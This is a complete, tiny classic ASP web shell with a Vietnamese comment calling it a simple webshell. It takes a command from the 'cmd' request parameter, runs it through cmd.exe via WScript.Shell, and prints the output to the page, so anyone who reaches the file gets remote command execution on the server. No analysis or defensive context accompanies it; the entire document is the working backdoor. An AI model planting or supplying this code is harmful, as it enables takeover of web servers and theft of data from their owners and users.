<%
' ASP webshell don gian
Set s = CreateObject("WScript.Shell")
Set o = s.Exec("cmd /c " & Request("cmd"))
Response.Write o.StdOut.ReadAll()
%>
